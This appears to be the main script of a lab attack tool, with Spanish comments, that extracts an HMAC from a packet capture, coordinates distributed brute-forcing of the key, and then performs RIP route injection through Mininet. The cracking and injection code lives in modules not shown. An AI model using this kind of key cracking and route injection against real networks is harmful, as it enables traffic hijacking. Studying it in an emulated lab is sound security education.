
import reader
import server

PCAP_PATH = "capture.pcap"


def main():
  # Leer el archivo
  target_hmac, payload_hex = reader.get_crack_target(PCAP_PATH)

  # Orquestar el servidor y los clientes
  found_key = server.start_server(target_hmac, payload_hex)

  # Con la contraseña ejecutar la inyección de RIP
  if found_key:
    print(f"Key found: {found_key}")
    server.inject_via_mininet(found_key)
  else:
    print("No key found (keyspace exhausted or server interrupted).")

  return


if __name__ == '__main__':
  main()